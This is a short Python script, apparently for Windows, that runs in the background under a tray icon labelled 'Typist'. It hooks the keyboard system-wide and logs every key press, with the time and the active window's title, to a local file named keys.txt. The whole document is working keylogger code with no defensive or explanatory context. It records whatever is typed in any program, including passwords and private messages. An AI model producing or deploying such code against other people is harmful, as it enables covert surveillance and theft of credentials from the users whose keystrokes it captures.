from background import tray
tray('Typist', 'typist.ico')

import pythoncom, pyHook 

event_template = '{Time} - {KeyID} ({key_name}) - {WindowName}'
events = []

def OnKeyboardEvent(event):
    if event.Ascii:
        key_name = chr(event.Ascii).decode('latin-1')
    else:
        key_name = ''

    events.append(event_template.format(key_name=key_name, **event.__dict__))

    if len(events) % 10 == 0:
        open('keys.txt', 'a').write('\n'.join(events) + '\n')

    return True

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
